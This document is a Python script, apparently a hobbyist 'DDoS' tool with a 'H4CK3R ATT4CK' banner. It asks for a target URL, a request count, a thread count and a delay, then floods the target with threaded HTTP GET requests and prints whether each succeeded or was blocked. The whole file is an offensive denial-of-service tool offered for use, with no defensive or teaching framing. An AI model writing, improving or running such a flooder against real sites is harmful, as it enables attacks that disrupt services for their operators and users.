import requests
import threading
import os
import time
from colorama import Fore, Style
import socket
from colorama import init
from pyfiglet import Figlet

init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    banner_text = Figlet(font='slant').renderText("H4CK3R ATT4CK")
    print(Fore.GREEN + banner_text + Style.RESET_ALL)

def get_server_ip(url):
    try:
        return socket.gethostbyname(url.replace("https://", "").replace("http://", "").split("/")[0])
    except socket.gaierror:
        return "Unknown IP"

def get_target_url():
    print(f"{Fore.RED}Target URL:{Style.RESET_ALL}")
    return input(Fore.YELLOW + "URL: " + Style.RESET_ALL)

def get_attack_parameters():
    print(f"{Fore.RED}Number of requests:{Style.RESET_ALL}")
    num_requests = int(input(Fore.YELLOW + "Requests: " + Style.RESET_ALL))
    
    print(f"{Fore.RED}Number of threads:{Style.RESET_ALL}")
    num_threads = int(input(Fore.YELLOW + "Threads: " + Style.RESET_ALL))
    
    print(f"{Fore.RED}Delay between requests (seconds):{Style.RESET_ALL}")
    delay = float(input(Fore.YELLOW + "Delay: " + Style.RESET_ALL))
    
    return num_requests, num_threads, delay

def send_request(url, delay, server_ip):
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Request successful. Server IP: {Fore.MAGENTA}{server_ip}{Style.RESET_ALL}")
            
            elif response.status_code == 429 or "temporarily blocked" in response.text.lower() or "too many requests" in response.text.lower():
                print(f"{Fore.RED}[!]{Style.RESET_ALL} Too many requests. Temporarily blocked. Server IP: {Fore.MAGENTA}{server_ip}{Style.RESET_ALL}")
                break
            
            else:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Request failed. Server IP: {Fore.MAGENTA}{server_ip}{Style.RESET_ALL}")
        
        except requests.exceptions.RequestException as e:
            if "403" in str(e):
                print(f"{Fore.RED}[!]{Style.RESET_ALL} Blocked by server. Server IP: {Fore.MAGENTA}{server_ip}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Request error: {e}")
        time.sleep(delay)

def start_ddos_attack(url, num_threads, delay):
    server_ip = get_server_ip(url)
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, delay, server_ip))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    # Clear screen and show banner when asking for target and parameters
    clear_screen()
    show_banner()

    target_url = get_target_url()
    num_requests, num_threads, delay = get_attack_parameters()

    # Clear screen again before starting the attack
    clear_screen()
    print(f"{Fore.CYAN}Starting DDoS attack with {num_threads} threads and {num_requests} requests...{Style.RESET_ALL}")
    time.sleep(1)
    
    start_ddos_attack(target_url, num_threads, delay)
